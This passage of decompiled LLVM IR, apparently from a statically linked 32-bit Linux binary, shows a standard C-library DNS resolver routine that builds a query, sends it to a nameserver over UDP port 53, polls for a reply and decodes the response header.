  %v3_8064b1e = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8)
  store i32 %v3_8064b1e, i32* %eax.global-to-local, align 4
  %v0_8064b23 = load i32, i32* @esp, align 4
  %v1_8064b23 = add i32 %v0_8064b23, 28
  %v2_8064b23 = inttoptr i32 %v1_8064b23 to i32*
  %v3_8064b23 = load i32, i32* %v2_8064b23, align 4
  store i32 %v3_8064b23, i32* %eax.global-to-local, align 4
  %v1_8064b27 = add i32 %v0_8064b23, 260
  %v2_8064b27 = inttoptr i32 %v1_8064b27 to i32*
  %v3_8064b27 = load i32, i32* %v2_8064b27, align 4
  store i32 %v3_8064b27, i32* @edx, align 4
  %v2_8064b2e = add i32 %v0_8064b23, 216
  %v3_8064b2e = inttoptr i32 %v2_8064b2e to i32*
  store i32 %v3_8064b23, i32* %v3_8064b2e, align 4
  %v0_8064b35 = load i32, i32* @edx, align 4
  %v1_8064b35 = load i32, i32* @esp, align 4
  %v2_8064b35 = add i32 %v1_8064b35, 220
  %v3_8064b35 = inttoptr i32 %v2_8064b35 to i32*
  store i32 %v0_8064b35, i32* %v3_8064b35, align 4
  %v0_8064b3c = load i32, i32* @esp, align 4
  %v1_8064b3c = add i32 %v0_8064b3c, 224
  %v2_8064b3c = inttoptr i32 %v1_8064b3c to i32*
  store i32 1, i32* %v2_8064b3c, align 4
  %v0_8064b4c = load i32, i32* @esp, align 4
  %v1_8064b4f = load i32, i32* @ebx, align 4
  %v2_8064b4f = sub i32 512, %v1_8064b4f
  %v2_8064b51 = add i32 %v0_8064b4c, 8
  %v3_8064b51 = inttoptr i32 %v2_8064b51 to i32*
  store i32 %v2_8064b4f, i32* %v3_8064b51, align 4
  %v1_8064b52 = load i32, i32* @ebx, align 4
  %v2_8064b52 = add i32 %v1_8064b52, %v2_806493a
  %v2_8064b56 = add i32 %v0_8064b4c, 4
  %v3_8064b56 = inttoptr i32 %v2_8064b56 to i32*
  store i32 %v2_8064b52, i32* %v3_8064b56, align 4
  %v1_8064b57 = add i32 %v0_8064b4c, 216
  store i32 %v1_8064b57, i32* @eax, align 4
  %v3_8064b5e = inttoptr i32 %v0_8064b4c to i32*
  store i32 %v1_8064b57, i32* %v3_8064b5e, align 4
  %v0_8064b5f = call i32 @__encode_question()
  store i32 %v0_8064b5f, i32* %eax.global-to-local, align 4
  %v0_8064b64 = load i32, i32* @esp, align 4
  store i32 %v0_8064b5f, i32* @esi, align 4
  %v2_8064b69 = icmp slt i32 %v0_8064b5f, 0
  br i1 %v2_8064b69, label %dec_label_pc_8064fcd, label %dec_label_pc_8064b71

dec_label_pc_8064b71:                             ; preds = %dec_label_pc_8064b12
  %v1_8064b71 = add i32 %v0_8064b64, 172
  %v2_8064b71 = inttoptr i32 %v1_8064b71 to i16*
  store i16 2, i16* %v2_8064b71, align 2
  %v1_8064b7b = load i32, i32* @esp, align 4
  %v2_8064b7b = add i32 %v1_8064b7b, -4
  %v3_8064b7b = inttoptr i32 %v2_8064b7b to i32*
  store i32 %v0_8064b5f, i32* %v3_8064b7b, align 4
  %v1_8064b7c = add i32 %v1_8064b7b, 164
  store i32 %v1_8064b7c, i32* %eax.global-to-local, align 4
  %v2_8064b83 = add i32 %v1_8064b7b, -8
  %v3_8064b83 = inttoptr i32 %v2_8064b83 to i32*
  store i32 %v1_8064b7c, i32* %v3_8064b83, align 4
  %v1_8064b84 = add i32 %v1_8064b7b, 32
  %v2_8064b84 = inttoptr i32 %v1_8064b84 to i32*
  %v3_8064b84 = load i32, i32* %v2_8064b84, align 4
  %v5_8064b84 = add i32 %v1_8064b7b, -12
  %v6_8064b84 = inttoptr i32 %v5_8064b84 to i32*
  store i32 %v3_8064b84, i32* %v6_8064b84, align 4
  %v1_8064b88 = add i32 %v1_8064b7b, -16
  %v2_8064b88 = inttoptr i32 %v1_8064b88 to i32*
  store i32 10, i32* %v2_8064b88, align 4
  %v5_8064b8a = call i32 @inet_pton(i32 -1, i8* %v4_8064b8a, i32 %v3_8064a27)
  store i32 %v5_8064b8a, i32* %eax.global-to-local, align 4
  %v0_8064b8f = load i32, i32* @esp, align 4
  %v1_8064b8f = add i32 %v0_8064b8f, 16
  %tmp51 = icmp slt i32 %v5_8064b8a, 1
  br i1 %tmp51, label %dec_label_pc_8064ba0, label %dec_label_pc_8064b96

dec_label_pc_8064b96:                             ; preds = %dec_label_pc_8064b71
  %v1_8064b96 = add i32 %v0_8064b8f, 172
  %v2_8064b96 = inttoptr i32 %v1_8064b96 to i16*
  store i16 10, i16* %v2_8064b96, align 2
  %v0_8064ba0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064ba0

dec_label_pc_8064ba0:                             ; preds = %dec_label_pc_8064b71, %dec_label_pc_8064b96
  %v0_8064bb7 = phi i32 [ %v1_8064b8f, %dec_label_pc_8064b71 ], [ %v0_8064ba0.pre, %dec_label_pc_8064b96 ]
  %v1_8064ba0 = add i32 %v0_8064bb7, 156
  %v2_8064ba0 = inttoptr i32 %v1_8064ba0 to i16*
  %v3_8064ba0 = load i16, i16* %v2_8064ba0, align 2
  %v12_8064ba0 = icmp eq i16 %v3_8064ba0, 10
  %v1_8064ba9 = icmp eq i1 %v12_8064ba0, false
  %v1_8064bb7 = add i32 %v0_8064bb7, 158
  %v2_8064bb7 = inttoptr i32 %v1_8064bb7 to i16*
  store i16 13568, i16* %v2_8064bb7, align 2
  %v0_8064bc1 = load i32, i32* @esp, align 4
  br i1 %v1_8064ba9, label %dec_label_pc_8064bb7, label %dec_label_pc_8064bd7

dec_label_pc_8064bb7:                             ; preds = %dec_label_pc_8064ba0
  %v1_8064bc4 = add i32 %v0_8064bc1, 32
  %v2_8064bc4 = inttoptr i32 %v1_8064bc4 to i32*
  %v3_8064bc4 = load i32, i32* %v2_8064bc4, align 4
  %v5_8064bc4 = add i32 %v0_8064bc1, -16
  %v6_8064bc4 = inttoptr i32 %v5_8064bc4 to i32*
  store i32 %v3_8064bc4, i32* %v6_8064bc4, align 4
  %v1_8064bc8 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8064bc8, i32* %eax.global-to-local, align 4
  %v1_8064bcd = load i32, i32* @esp, align 4
  %v2_8064bcd = add i32 %v1_8064bcd, 176
  %v3_8064bcd = inttoptr i32 %v2_8064bcd to i32*
  store i32 %v1_8064bc8, i32* %v3_8064bcd, align 4
  %v0_8064bd4 = load i32, i32* @esp, align 4
  %v1_8064bd4 = add i32 %v0_8064bd4, 16
  br label %dec_label_pc_8064bd7

dec_label_pc_8064bd7:                             ; preds = %dec_label_pc_8064ba0, %dec_label_pc_8064bb7
  %v1_8064bd7 = phi i32 [ %v1_8064bd4, %dec_label_pc_8064bb7 ], [ %v0_8064bc1, %dec_label_pc_8064ba0 ]
  %v0_8064bd7 = load i32, i32* @ecx, align 4
  %v2_8064bd7 = add i32 %v1_8064bd7, -4
  %v3_8064bd7 = inttoptr i32 %v2_8064bd7 to i32*
  store i32 %v0_8064bd7, i32* %v3_8064bd7, align 4
  %v1_8064bd8 = add i32 %v1_8064bd7, -8
  %v2_8064bd8 = inttoptr i32 %v1_8064bd8 to i32*
  store i32 17, i32* %v2_8064bd8, align 4
  %v1_8064bda = add i32 %v1_8064bd7, -12
  %v2_8064bda = inttoptr i32 %v1_8064bda to i32*
  store i32 2, i32* %v2_8064bda, align 4
  %v1_8064bdc = add i32 %v1_8064bd7, 156
  %v2_8064bdc = inttoptr i32 %v1_8064bdc to i16*
  %v3_8064bdc = load i16, i16* %v2_8064bdc, align 2
  %v4_8064bdc = zext i16 %v3_8064bdc to i32
  store i32 %v4_8064bdc, i32* %eax.global-to-local, align 4
  %v2_8064be4 = add i32 %v1_8064bd7, -16
  %v3_8064be4 = inttoptr i32 %v2_8064be4 to i32*
  store i32 %v4_8064bdc, i32* %v3_8064be4, align 4
  %v4_8064be5 = call i32 @socket(i32 -1, i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v4_8064be5, i32* %eax.global-to-local, align 4
  %v1_8064bea = load i32, i32* @esp, align 4
  %v2_8064bea = add i32 %v1_8064bea, 36
  %v3_8064bea = inttoptr i32 %v2_8064bea to i32*
  store i32 %v4_8064be5, i32* %v3_8064bea, align 4
  %v0_8064bee = load i32, i32* @esp, align 4
  %v1_8064bee = add i32 %v0_8064bee, 16
  %v0_8064bf1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8064bf1 = icmp slt i32 %v0_8064bf1, 0
  br i1 %v2_8064bf1, label %dec_label_pc_8064c1e, label %dec_label_pc_8064bf5

dec_label_pc_8064bf5:                             ; preds = %dec_label_pc_8064bd7
  %v1_8064bf5 = add i32 %v0_8064bee, 172
  store i32 %v1_8064bf5, i32* %eax.global-to-local, align 4
  %v0_8064bfc = load i32, i32* @edx, align 4
  %v2_8064bfc = add i32 %v0_8064bee, 12
  %v3_8064bfc = inttoptr i32 %v2_8064bfc to i32*
  store i32 %v0_8064bfc, i32* %v3_8064bfc, align 4
  %v1_8064bfd = add i32 %v0_8064bee, 8
  %v2_8064bfd = inttoptr i32 %v1_8064bfd to i32*
  store i32 28, i32* %v2_8064bfd, align 4
  %v0_8064bff = load i32, i32* %eax.global-to-local, align 4
  %v2_8064bff = add i32 %v0_8064bee, 4
  %v3_8064bff = inttoptr i32 %v2_8064bff to i32*
  store i32 %v0_8064bff, i32* %v3_8064bff, align 4
  %v1_8064c00 = add i32 %v0_8064bee, 36
  %v2_8064c00 = inttoptr i32 %v1_8064c00 to i32*
  %v3_8064c00 = load i32, i32* %v2_8064c00, align 4
  %v6_8064c00 = inttoptr i32 %v0_8064bee to i32*
  store i32 %v3_8064c00, i32* %v6_8064c00, align 4
  %v4_8064c04 = call i32 @__libc_connect(i32 -1, i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v4_8064c04, i32* %eax.global-to-local, align 4
  %v0_8064c09 = load i32, i32* @esp, align 4
  %v2_8064c0c = icmp slt i32 %v4_8064c04, 0
  %v1_8064c0e = icmp eq i1 %v2_8064c0c, false
  br i1 %v1_8064c0e, label %dec_label_pc_8064c27, label %dec_label_pc_8064c10

dec_label_pc_8064c10:                             ; preds = %dec_label_pc_8064bf5
  %v1_8064c10 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8064c10, i32* %eax.global-to-local, align 4
  %v1_8064c15 = inttoptr i32 %v1_8064c10 to i32*
  %v2_8064c15 = load i32, i32* %v1_8064c15, align 4
  %v11_8064c15 = icmp eq i32 %v2_8064c15, 101
  %v0_8064f87.pre = load i32, i32* @esp, align 4
  br i1 %v11_8064c15, label %dec_label_pc_8064f87, label %dec_label_pc_8064c1e

dec_label_pc_8064c1e:                             ; preds = %dec_label_pc_8064c10, %dec_label_pc_8064bd7
  %v17_8064c1e = phi i32 [ %v1_8064bee, %dec_label_pc_8064bd7 ], [ %v0_8064f87.pre, %dec_label_pc_8064c10 ]
  %v1_8064c1e = add i32 %v17_8064c1e, 28
  %v2_8064c1e = inttoptr i32 %v1_8064c1e to i32*
  %v3_8064c1e = load i32, i32* %v2_8064c1e, align 4
  %v4_8064c1e = add i32 %v3_8064c1e, 1
  store i32 %v4_8064c1e, i32* %v2_8064c1e, align 4
  br label %dec_label_pc_8064fa8.backedge

dec_label_pc_8064c27:                             ; preds = %dec_label_pc_8064bf5
  %v0_8064c27 = load i32, i32* @ebx, align 4
  %v1_8064c27 = load i32, i32* @esi, align 4
  %v2_8064c27 = add i32 %v1_8064c27, %v0_8064c27
  store i32 %v2_8064c27, i32* %eax.global-to-local, align 4
  %v1_8064c2a = add i32 %v0_8064c09, 12
  %v2_8064c2a = inttoptr i32 %v1_8064c2a to i32*
  store i32 0, i32* %v2_8064c2a, align 4
  %v0_8064c2c = load i32, i32* %eax.global-to-local, align 4
  %v2_8064c2c = add i32 %v0_8064c09, 8
  %v3_8064c2c = inttoptr i32 %v2_8064c2c to i32*
  store i32 %v0_8064c2c, i32* %v3_8064c2c, align 4
  %v2_8064c2d = add i32 %v0_8064c09, 4
  %v3_8064c2d = inttoptr i32 %v2_8064c2d to i32*
  store i32 %v2_806493a, i32* %v3_8064c2d, align 4
  %v1_8064c2e = add i32 %v0_8064c09, 36
  %v2_8064c2e = inttoptr i32 %v1_8064c2e to i32*
  %v3_8064c2e = load i32, i32* %v2_8064c2e, align 4
  %v6_8064c2e = inttoptr i32 %v0_8064c09 to i32*
  store i32 %v3_8064c2e, i32* %v6_8064c2e, align 4
  %v5_8064c32 = call i32 @__libc_send(i32 -1, i32 %v15_80649c8, i32 %v3_8064a27, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8064c32, i32* %eax.global-to-local, align 4
  %v0_8064c37 = load i32, i32* @esp, align 4
  %v1_8064c37 = add i32 %v0_8064c37, 36
  %v2_8064c37 = inttoptr i32 %v1_8064c37 to i32*
  %v3_8064c37 = load i32, i32* %v2_8064c37, align 4
  %v2_8064c3b = add i32 %v0_8064c37, 228
  %v3_8064c3b = inttoptr i32 %v2_8064c3b to i32*
  store i32 %v3_8064c37, i32* %v3_8064c3b, align 4
  %v0_8064c42 = load i32, i32* @esp, align 4
  %v1_8064c42 = add i32 %v0_8064c42, 232
  %v2_8064c42 = inttoptr i32 %v1_8064c42 to i16*
  store i16 1, i16* %v2_8064c42, align 2
  %v0_8064c4c = load i32, i32* @esp, align 4
  %v1_8064c4f = add i32 %v0_8064c4c, 8
  %v2_8064c4f = inttoptr i32 %v1_8064c4f to i32*
  store i32 10000, i32* %v2_8064c4f, align 4
  %v1_8064c54 = add i32 %v0_8064c4c, 4
  %v2_8064c54 = inttoptr i32 %v1_8064c54 to i32*
  store i32 1, i32* %v2_8064c54, align 4
  %v1_8064c56 = add i32 %v0_8064c4c, 228
  store i32 %v1_8064c56, i32* %eax.global-to-local, align 4
  %v3_8064c5d = inttoptr i32 %v0_8064c4c to i32*
  store i32 %v1_8064c56, i32* %v3_8064c5d, align 4
  %v5_8064c5e = call i32 @__libc_poll(%pollfd* inttoptr (i32 -1 to %pollfd*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064c5e, i32* %eax.global-to-local, align 4
  %v0_8064c63 = load i32, i32* @esp, align 4
  %v1_8064c63 = add i32 %v0_8064c63, 16
  %tmp52 = icmp slt i32 %v5_8064c5e, 1
  br i1 %tmp52, label %dec_label_pc_8064f87, label %dec_label_pc_8064c6e

dec_label_pc_8064c6e:                             ; preds = %dec_label_pc_8064c27
  %v1_8064c6e = add i32 %v0_8064c63, 12
  %v2_8064c6e = inttoptr i32 %v1_8064c6e to i32*
  store i32 0, i32* %v2_8064c6e, align 4
  %v1_8064c70 = add i32 %v0_8064c63, 8
  %v2_8064c70 = inttoptr i32 %v1_8064c70 to i32*
  store i32 512, i32* %v2_8064c70, align 4
  %v2_8064c75 = add i32 %v0_8064c63, 4
  %v3_8064c75 = inttoptr i32 %v2_8064c75 to i32*
  store i32 %v2_806493a, i32* %v3_8064c75, align 4
  %v1_8064c76 = add i32 %v0_8064c63, 36
  %v2_8064c76 = inttoptr i32 %v1_8064c76 to i32*
  %v3_8064c76 = load i32, i32* %v2_8064c76, align 4
  %v6_8064c76 = inttoptr i32 %v0_8064c63 to i32*
  store i32 %v3_8064c76, i32* %v6_8064c76, align 4
  %v5_8064c7a = call i32 @__libc_recv(i32 -1, i32 %v15_80649c8, i32 %v3_8064a27, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8064c7a, i32* %eax.global-to-local, align 4
  %v1_8064c7f = load i32, i32* @esp, align 4
  %v2_8064c7f = add i32 %v1_8064c7f, 32
  %v3_8064c7f = inttoptr i32 %v2_8064c7f to i32*
  store i32 %v5_8064c7a, i32* %v3_8064c7f, align 4
  %v0_8064c83 = load i32, i32* @esp, align 4
  %v1_8064c83 = add i32 %v0_8064c83, 16
  %v7_8064c89 = icmp sgt i32 %v5_8064c7a, 11
  br i1 %v7_8064c89, label %dec_label_pc_8064c8f, label %dec_label_pc_8064f3c

dec_label_pc_8064c8f:                             ; preds = %dec_label_pc_8064c6e
  %v0_8064c8f = load i32, i32* @ebx, align 4
  %v2_8064c8f = add i32 %v0_8064c83, 12
  %v3_8064c8f = inttoptr i32 %v2_8064c8f to i32*
  store i32 %v0_8064c8f, i32* %v3_8064c8f, align 4
  %v0_8064c90 = load i32, i32* @ebx, align 4
  %v2_8064c90 = add i32 %v0_8064c83, 8
  %v3_8064c90 = inttoptr i32 %v2_8064c90 to i32*
  store i32 %v0_8064c90, i32* %v3_8064c90, align 4
  %v1_8064c91 = add i32 %v0_8064c83, 84
  store i32 %v1_8064c91, i32* %eax.global-to-local, align 4
  %v2_8064c95 = add i32 %v0_8064c83, 4
  %v3_8064c95 = inttoptr i32 %v2_8064c95 to i32*
  store i32 %v1_8064c91, i32* %v3_8064c95, align 4
  %v3_8064c96 = inttoptr i32 %v0_8064c83 to i32*
  store i32 %v2_806493a, i32* %v3_8064c96, align 4
  %v0_8064c97 = call i32 @__decode_header()
  store i32 %v0_8064c97, i32* %eax.global-to-local, align 4
  %v0_8064c9c = load i32, i32* @esp, align 4
  %v1_8064c9c = add i32 %v0_8064c9c, 84
  %v2_8064c9c = inttoptr i32 %v1_8064c9c to i32*
  %v3_8064c9c = load i32, i32* %v2_8064c9c, align 4
  store i32 %v3_8064c9c, i32* %edx.global-to-local, align 4
  %v2_8064ca0 = add i32 %v0_8064c9c, 72
  %v3_8064ca0 = inttoptr i32 %v2_8064ca0 to i32*
  store i32 %v3_8064c9c, i32* %v3_8064ca0, align 4
  %v0_8064ca4 = load i32, i32* @esp, align 4
  %v1_8064ca4 = add i32 %v0_8064ca4, 16
  %v1_8064ca7 = add i32 %v0_8064ca4, 60
  %v2_8064ca7 = inttoptr i32 %v1_8064ca7 to i32*
  %v3_8064ca7 = load i32, i32* %v2_8064ca7, align 4
  store i32 %v3_8064ca7, i32* %eax.global-to-local, align 4
  %v0_8064cab = load i32, i32* %edx.global-to-local, align 4
  %v12_8064cab = icmp eq i32 %v0_8064cab, %v3_8064ca7
  %v1_8064cad = icmp eq i1 %v12_8064cab, false
  br i1 %v1_8064cad, label %dec_label_pc_8064f3c, label %dec_label_pc_8064cb3

dec_label_pc_8064cb3:                             ; preds = %dec_label_pc_8064c8f
  %v1_8064cb3 = add i32 %v0_8064ca4, 88
  %v2_8064cb3 = inttoptr i32 %v1_8064cb3 to i32*
  %v3_8064cb3 = load i32, i32* %v2_8064cb3, align 4
  %v4_8064cb3 = icmp eq i32 %v3_8064cb3, 0
  br i1 %v4_8064cb3, label %dec_label_pc_8064f3c, label %dec_label_pc_8064cbe

dec_label_pc_8064cbe:                             ; preds = %dec_label_pc_8064cb3
  %v1_8064cbe = add i32 %v0_8064ca4, 112
  %v2_8064cbe = inttoptr i32 %v1_8064cbe to i32*
  %v3_8064cbe = load i32, i32* %v2_8064cbe, align 4
  store i32 %v3_8064cbe, i32* %eax.global-to-local, align 4
  %v9_8064cc2 = icmp eq i32 %v3_8064cbe, 3
  %v1_8064cc5 = icmp eq i1 %v9_8064cc2, false
  br i1 %v1_8064cc5, label %dec_label_pc_8064d2d, label %dec_label_pc_8064cc7

dec_label_pc_8064cc7:                             ; preds = %dec_label_pc_8064cbe
  %v1_8064cc7 = add i32 %v0_8064ca4, 67
  %v2_8064cc7 = inttoptr i32 %v1_8064cc7 to i8*
  %v3_8064cc7 = load i8, i8* %v2_8064cc7, align 1
  %v4_8064cc7 = icmp eq i8 %v3_8064cc7, 0
  %v1_8064ccc = icmp eq i1 %v4_8064cc7, false
  br i1 %v1_8064ccc, label %dec_label_pc_8064d1d, label %dec_label_pc_8064cce

dec_label_pc_8064cce:                             ; preds = %dec_label_pc_8064cc7
  %v0_8064cce = load i32, i32* @ecx, align 4
  %v2_8064cce = add i32 %v0_8064ca4, 12
  %v3_8064cce = inttoptr i32 %v2_8064cce to i32*
  store i32 %v0_8064cce, i32* %v3_8064cce, align 4
  %v1_8064ccf = add i32 %v0_8064ca4, 8
  %v2_8064ccf = inttoptr i32 %v1_8064ccf to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v2_8064ccf, align 4
  %v1_8064cd4 = add i32 %v0_8064ca4, 4
  %v2_8064cd4 = inttoptr i32 %v1_8064cd4 to i32*
  store i32 134585853, i32* %v2_8064cd4, align 4
  %v1_8064cd9 = add i32 %v0_8064ca4, 200
  store i32 %v1_8064cd9, i32* @esi, align 4
  %v3_8064ce0 = inttoptr i32 %v0_8064ca4 to i32*
  store i32 %v1_8064cd9, i32* %v3_8064ce0, align 4
  %v5_8064ce1 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064ce1, i32* %eax.global-to-local, align 4
  %v0_8064ce6 = load i32, i32* @esp, align 4
  %v1_8064ce6 = inttoptr i32 %v0_8064ce6 to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v1_8064ce6, align 4
  %v1_8064ced = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8064ced, i32* %eax.global-to-local, align 4
  %v0_8064cf2 = load i32, i32* @esp, align 4
  %v1_8064cf2 = inttoptr i32 %v0_8064cf2 to i32*
  %v2_8064cf2 = load i32, i32* %v1_8064cf2, align 4
  store i32 %v2_8064cf2, i32* %eax.global-to-local, align 4
  %v3_8064cf2 = add i32 %v0_8064cf2, 4
  %v1_8064cf3 = inttoptr i32 %v3_8064cf2 to i32*
  %v2_8064cf3 = load i32, i32* %v1_8064cf3, align 4
  store i32 %v2_8064cf3, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8064cf3, align 4
  %v0_8064cf6 = load i32, i32* @esi, align 4
  store i32 %v0_8064cf6, i32* %v1_8064cf2, align 4
  %v0_8064cf7 = load i32, i32* @global_var_807ea64.825, align 4
  store i32 %v0_8064cf7, i32* @ebx, align 4
  %v3_8064cfd = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8)
  store i32 %v3_8064cfd, i32* %eax.global-to-local, align 4
  %v0_8064d02 = load i32, i32* @esp, align 4
  %v0_8064d05 = load i32, i32* @ebx, align 4
  %v1_8064d05 = add i32 %v0_8064d05, -1
  store i32 %v1_8064d05, i32* @ebx, align 4
  %v1_8064d06 = add i32 %v0_8064d02, 52
  %v2_8064d06 = inttoptr i32 %v1_8064d06 to i32*
  %v3_8064d06 = load i32, i32* %v2_8064d06, align 4
  %v5_8064d06 = sub i32 %v3_8064d06, %v1_8064d05
  %v11_8064d06 = xor i32 %v3_8064d06, %v1_8064d05
  %v12_8064d06 = xor i32 %v5_8064d06, %v3_8064d06
  %v13_8064d06 = and i32 %v12_8064d06, %v11_8064d06
  %v14_8064d06 = icmp slt i32 %v13_8064d06, 0
  %v16_8064d06 = icmp slt i32 %v5_8064d06, 0
  %v2_8064d0a = icmp eq i1 %v16_8064d06, %v14_8064d06
  br i1 %v2_8064d0a, label %dec_label_pc_8064d1d, label %dec_label_pc_8064d0c

dec_label_pc_8064d0c:                             ; preds = %dec_label_pc_8064cce
  %v4_8064d0c = add i32 %v3_8064d06, 1
  store i32 %v4_8064d0c, i32* %v2_8064d06, align 4
  %v0_8064d10 = load i32, i32* @esp, align 4
  %v1_8064d10 = add i32 %v0_8064d10, 56
  %v2_8064d10 = inttoptr i32 %v1_8064d10 to i32*
  %v3_8064d10 = load i32, i32* %v2_8064d10, align 4
  store i32 %v3_8064d10, i32* %edx.global-to-local, align 4
  %v2_8064d14 = add i32 %v0_8064d10, 44
  %v3_8064d14 = inttoptr i32 %v2_8064d14 to i32*
  store i32 %v3_8064d10, i32* %v3_8064d14, align 4
  br label %dec_label_pc_8064fa8.backedge

dec_label_pc_8064d1d:                             ; preds = %dec_label_pc_8064cce, %dec_label_pc_8064cc7
  %v0_8064d1d = call i32 @__GI___h_errno_location()
  store i32 %v0_8064d1d, i32* %eax.global-to-local, align 4
  %v1_8064d22 = inttoptr i32 %v0_8064d1d to i32*
  store i32 1, i32* %v1_8064d22, align 4
  br label %dec_label_pc_8064fe0

dec_label_pc_8064d2d:                             ; preds = %dec_label_pc_8064cbe
  %v1_8064d2d = icmp eq i32 %v3_8064cbe, 0
  %v1_8064d2f = icmp eq i1 %v1_8064d2d, false
  br i1 %v1_8064d2f, label %dec_label_pc_8064f3c, label %dec_label_pc_8064d35

dec_label_pc_8064d35:                             ; preds = %dec_label_pc_8064d2d
  %v1_8064d35 = add i32 %v0_8064ca4, 120
  %v2_8064d35 = inttoptr i32 %v1_8064d35 to i32*
  %v3_8064d35 = load i32, i32* %v2_8064d35, align 4
  %tmp53 = icmp slt i32 %v3_8064d35, 1
  br i1 %tmp53, label %dec_label_pc_8064d45, label %dec_label_pc_8064d3c

dec_label_pc_8064d3c:                             ; preds = %dec_label_pc_8064d35
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8064d6459 = add i32 %v0_8064ca4, 116
  %v3_8064d6460 = inttoptr i32 %v2_8064d6459 to i32*
  %v4_8064d6461 = load i32, i32* %v3_8064d6460, align 4
  %v5_8064d6462 = sub i32 0, %v4_8064d6461
  %v13_8064d6466 = and i32 %v4_8064d6461, %v5_8064d6462
  %v14_8064d6467 = icmp slt i32 %v13_8064d6466, 0
  %v16_8064d6469 = icmp slt i32 %v5_8064d6462, 0
  %v2_8064d6870 = icmp eq i1 %v16_8064d6469, %v14_8064d6467
  br i1 %v2_8064d6870, label %dec_label_pc_8064d6a, label %dec_label_pc_8064d55

dec_label_pc_8064d45:                             ; preds = %dec_label_pc_8064d35
  %v0_8064d45 = call i32 @__GI___h_errno_location()
  store i32 %v0_8064d45, i32* %eax.global-to-local, align 4
  %v1_8064d4a = inttoptr i32 %v0_8064d45 to i32*
  store i32 4, i32* %v1_8064d4a, align 4
  br label %dec_label_pc_8064fe0

dec_label_pc_8064d55:                             ; preds = %dec_label_pc_8064d3c, %dec_label_pc_8064d55
  %v0_8064d6c72 = phi i32 [ %v1_8064d61, %dec_label_pc_8064d55 ], [ %v1_8064ca4, %dec_label_pc_8064d3c ]
  %v0_8064d5571 = phi i32 [ %v0_8064d59, %dec_label_pc_8064d55 ], [ %v3_8064cbe, %dec_label_pc_8064d3c ]
  %v2_8064d55 = add i32 %v0_8064d6c72, -4
  %v3_8064d55 = inttoptr i32 %v2_8064d55 to i32*
  store i32 %v0_8064d5571, i32* %v3_8064d55, align 4
  %v0_8064d56 = load i32, i32* %eax.global-to-local, align 4
  %v2_8064d56 = add i32 %v0_8064d6c72, -8
  %v3_8064d56 = inttoptr i32 %v2_8064d56 to i32*
  store i32 %v0_8064d56, i32* %v3_8064d56, align 4
  %v0_8064d57 = load i32, i32* @esi, align 4
  %v2_8064d57 = add i32 %v0_8064d6c72, -12
  %v3_8064d57 = inttoptr i32 %v2_8064d57 to i32*
  store i32 %v0_8064d57, i32* %v3_8064d57, align 4
  %v2_8064d58 = add i32 %v0_8064d6c72, -16
  %v3_8064d58 = inttoptr i32 %v2_8064d58 to i32*
  store i32 %v2_806493a, i32* %v3_8064d58, align 4
  %v0_8064d59 = call i32 @__length_question()
  store i32 %v0_8064d59, i32* %eax.global-to-local, align 4
  %v0_8064d5e = load i32, i32* @ebx, align 4
  %v1_8064d5e = add i32 %v0_8064d5e, 1
  store i32 %v1_8064d5e, i32* @ebx, align 4
  %v0_8064d5f = load i32, i32* @esi, align 4
  %v2_8064d5f = add i32 %v0_8064d5f, %v0_8064d59
  store i32 %v2_8064d5f, i32* @esi, align 4
  %v0_8064d61 = load i32, i32* @esp, align 4
  %v1_8064d61 = add i32 %v0_8064d61, 16
  %v2_8064d64 = add i32 %v0_8064d61, 116
  %v3_8064d64 = inttoptr i32 %v2_8064d64 to i32*
  %v4_8064d64 = load i32, i32* %v3_8064d64, align 4
  %v5_8064d64 = sub i32 %v1_8064d5e, %v4_8064d64
  %v11_8064d64 = xor i32 %v4_8064d64, %v1_8064d5e
  %v12_8064d64 = xor i32 %v5_8064d64, %v1_8064d5e
  %v13_8064d64 = and i32 %v12_8064d64, %v11_8064d64
  %v14_8064d64 = icmp slt i32 %v13_8064d64, 0
  %v16_8064d64 = icmp slt i32 %v5_8064d64, 0
  %v2_8064d68 = icmp eq i1 %v16_8064d64, %v14_8064d64
  br i1 %v2_8064d68, label %dec_label_pc_8064d6a, label %dec_label_pc_8064d55

dec_label_pc_8064d6a:                             ; preds = %dec_label_pc_8064d55, %dec_label_pc_8064d3c
  %v0_8064d6c.lcssa = phi i32 [ %v1_8064ca4, %dec_label_pc_8064d3c ], [ %v1_8064d61, %dec_label_pc_8064d55 ]
  store i32 0, i32* @ebx, align 4
  %v1_8064d6c = add i32 %v0_8064d6c.lcssa, 27
  %v2_8064d6c = inttoptr i32 %v1_8064d6c to i8*
  store i8 1, i8* %v2_8064d6c, align 1
  %v0_8064e9a.pre = load i32, i32* @ebx, align 4
  %v1_8064e9a.pre = load i32, i32* @esp, align 4
  %v2_8064e9a73 = add i32 %v1_8064e9a.pre, 104
  %v3_8064e9a74 = inttoptr i32 %v2_8064e9a73 to i32*
  %v4_8064e9a75 = load i32, i32* %v3_8064e9a74, align 4
  %v5_8064e9a76 = sub i32 %v0_8064e9a.pre, %v4_8064e9a75
  %v11_8064e9a78 = xor i32 %v4_8064e9a75, %v0_8064e9a.pre
  %v12_8064e9a79 = xor i32 %v5_8064e9a76, %v0_8064e9a.pre
  %v13_8064e9a80 = and i32 %v12_8064e9a79, %v11_8064e9a78
  %v14_8064e9a81 = icmp slt i32 %v13_8064e9a80, 0
  %v16_8064e9a83 = icmp slt i32 %v5_8064e9a76, 0
  %v2_8064e9e84 = icmp eq i1 %v16_8064e9a83, %v14_8064e9a81
